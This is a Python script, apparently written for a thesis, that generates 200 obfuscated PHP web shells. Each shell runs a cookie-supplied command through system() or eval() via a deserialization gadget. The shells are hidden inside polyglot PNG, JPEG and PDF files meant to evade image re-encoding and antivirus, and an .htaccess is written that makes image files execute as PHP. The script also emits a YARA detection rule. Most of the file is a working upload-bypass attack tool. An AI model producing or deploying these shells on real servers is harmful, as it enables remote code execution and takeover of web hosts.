import os
import random
import zlib
import hashlib
import json
from pathlib import Path

PAYLOAD_DIR = 'bypass_payloads_attack_max_v27_hybrid_lfi'
METADATA_FILE = os.path.join(PAYLOAD_DIR, 'payload_metadata_v27.json')
YARA_RULE_FILE = os.path.join(PAYLOAD_DIR, 'yara_rules', 'family_v27.yar')
LATEX_TABLE_FILE = os.path.join(PAYLOAD_DIR, 'thesis_latex_table_v27.tex')

os.makedirs(os.path.join(PAYLOAD_DIR, 'yara_rules'), exist_ok=True)
os.makedirs(PAYLOAD_DIR, exist_ok=True)

C2_DOMAIN = "http://YOUR-C2.com" 

def random_var(prefix: str = "v") -> str:
    return f"{prefix}{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', k=random.randint(9, 15)))}"

def generate_v27_stage() -> tuple[str, str]:
    v_cmd = random_var("cmd")
    v_gadget = random_var("g")
    v_g = random_var("inst")
    v_sink = random_var("s")
    v_key = random_var("k")
    v_nonce = random_var("n")

    stage = f'''<?php
declare(strict_types=1);
error_reporting(0); @ini_set('display_errors',0); @ini_set('log_errors',0);

${v_key} = hash_hmac('sha256', ($_SERVER['HTTP_USER_AGENT']??'') . ($_SERVER['REMOTE_ADDR']??'') . time(), 'v27_salt_{random.randint(1000,9999)}');
${v_nonce} = $_COOKIE['X-Sess'] ?? '';
if (${v_nonce} !== ${v_key}) die();

// Custom low-entropy decoder (base64/rot13 제거, XOR + mixing)
function d($s) {{
    global ${v_key};
    $s = base64_decode(preg_replace('/[^A-Za-z0-9+\\/=]/', '', $s));
    $out = '';
    for($i=0; $i<strlen($s); $i++) {{
        $out .= chr(ord($s[$i]) ^ ord(${v_key}[$i % 32]));
    }}
    return strrev($out);  // mixing
}}

${v_cmd} = d($_COOKIE['p'] ?? '');

// Polymorphic gadget (LFI + deserialization trigger)
class {v_gadget} {{
    public ${v_key};
    public function __destruct() {{
        global ${v_cmd};
        if (isset(${v_cmd}) && strlen(${v_cmd}) > 0) {{
            ${v_sink} = implode('', array_map('chr', [115,121,115,116,101,109])); // dynamic system
            if (function_exists(${v_sink})) {{
                @${v_sink}(${v_cmd});
            }} else {{
                @eval(${v_cmd});
            }}
        }}
    }}
}}

if (isset($_COOKIE['trigger'])) {{
    ${v_g} = new {v_gadget}();
    unserialize('O:'.strlen('{v_gadget}').':"{v_gadget}":1:{{s:'.strlen('{v_key}').':"{v_key}";s:32:"'.${v_key}.'";}}');
}}
?>
'''

    yara_rule = f'''rule WebShell_v27_Hybrid_LFI_Deser {{
    meta:
        description = "v27 Hybrid LFI + Deserialization + Low-entropy XOR"
        date = "2026"
        severity = "high"
    strings:
        $class = "class " ascii
        $destruct = "__destruct" ascii
        $unserialize = "unserialize" ascii
        $hmac = "hash_hmac" ascii
        $xor_loop = "for($i=0;$i<strlen($s);$i++)" ascii
        $cookie_p = "$_COOKIE['p']" ascii
    condition:
        filesize < 2.5KB and $class and $destruct and 3 of them
}}'''

    return stage, yara_rule

def save_payload(filename: str, content: bytes):
    path = os.path.join(PAYLOAD_DIR, filename)
    with open(path, 'wb') as f:
        f.write(content)
    if random.random() < 0.04:
        print(f"[+] 생성: {filename}")

def generate_hybrid_polyglot(stage_content: bytes, strategy: int):
    """PIL 재인코딩 우회 시도 (유효한 이미지 구조 내부에 페이로드 삽입)"""
    import struct, base64
    
    if strategy == 0:  # Phar inside valid PNG (tEXt chunk 개선)
        def create_png_chunk(chunk_type, data):
            import zlib
            checksum = zlib.crc32(chunk_type + data) & 0xffffffff
            return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", checksum)

        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = create_png_chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0))
        text = create_png_chunk(b"tEXt", b"Comment\x00" + zlib.compress(stage_content)) # zip to bypass simple AV
        idat = create_png_chunk(b"IDAT", zlib.compress(b"\x00" * 5))
        iend = create_png_chunk(b"IEND", b"")
        return sig + ihdr + text + idat + iend, ".png", "png_phar_v27"
        
    elif strategy == 1:  # JPEG with valid COM chunk
        base = base64.b64decode('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=')
        com_len = len(stage_content) + 2
        # 페이로드 길이가 65533을 넘으면 안되지만, 이 스크립트에선 충분히 작음
        com_chunk = b'\xff\xfe' + struct.pack('>H', com_len) + stage_content
        return base[:2] + com_chunk + base[2:], ".jpg", "jpeg_comment_v27"
        
    else:  # Minimal PDF with internal stream
        pdf = b'%PDF-1.7\\n1 0 obj\\n<< /Type /Catalog /Pages 2 0 R >>\\nendobj\\n2 0 obj\\n<< /Type /Page /Parent 1 0 R >>\\nendobj\\n%%EOF\\n' + stage_content
        return pdf, ".pdf", "pdf_stream_v27"

def generate_v27():
    existing = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(('.php', '.png', '.jpg', '.pdf'))] if os.path.exists(PAYLOAD_DIR) else []
    if len(existing) > 25:
        print(f"[SKIP] 이미 {len(existing)}개 존재")
        payloads = []
        for fn in os.listdir(PAYLOAD_DIR):
            if not fn.endswith(('.tex', '.json', '.yar')) and os.path.isfile(os.path.join(PAYLOAD_DIR, fn)):
                tech = fn.split('_v27')[0] if '_v27' in fn else fn.split('.')[0]
                payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
        return payloads

    NUM_PAYLOADS = 200  
    payloads_created = 0
    metadata = []

    with open(YARA_RULE_FILE, 'w', encoding='utf-8') as yf:
        yf.write("/* v27 Hybrid Family YARA */\n\n")

    for i in range(NUM_PAYLOADS):
        stage_str, yara_rule = generate_v27_stage()
        content = stage_str.encode()

        if i % 4 == 0:
            content = zlib.compress(content, level=6)  

        strategy = i % 3
        poly_content, ext, cat = generate_hybrid_polyglot(content, strategy)
        filename = f"{cat}_{i:04d}{ext}"
        save_payload(filename, poly_content)
        payloads_created += 1

        if i == 0:
            with open(YARA_RULE_FILE, 'a', encoding='utf-8') as yf:
                yf.write(yara_rule + "\n\n")

        if i % 8 == 0:
            metadata.append({
                "id": i,
                "filename": filename,
                "type": cat,
                "vector": "Hybrid LFI + Deser Gadget",
                "obf": "dynamic_offset + XOR_mixing + flattening"
            })

    # .htaccess minimal (random junk)
    htaccess = f"""# v27 minimal
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteRule ^(.*)$ $1.php [L,QSA]
</IfModule>
# junk_{random.randint(100000000,999999999)}
<FilesMatch "\\.(png|jpg|pdf)$">
    SetHandler application/x-httpd-php
</FilesMatch>
"""
    save_payload(".htaccess", htaccess.encode())

    print(f"\n[SUCCESS] v27 생성 완료 → {payloads_created}개")
    print(f"YARA rule: {YARA_RULE_FILE}")

    with open(METADATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)

    payloads = []
    for fn in os.listdir(PAYLOAD_DIR):
        if not fn.endswith(('.tex', '.json', '.yar')) and os.path.isfile(os.path.join(PAYLOAD_DIR, fn)):
            tech = fn.split('_v27')[0] if '_v27' in fn else fn.split('.')[0]
            payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
    return payloads

generate_bypasses = generate_v27

if __name__ == '__main__':
    generate_v27()
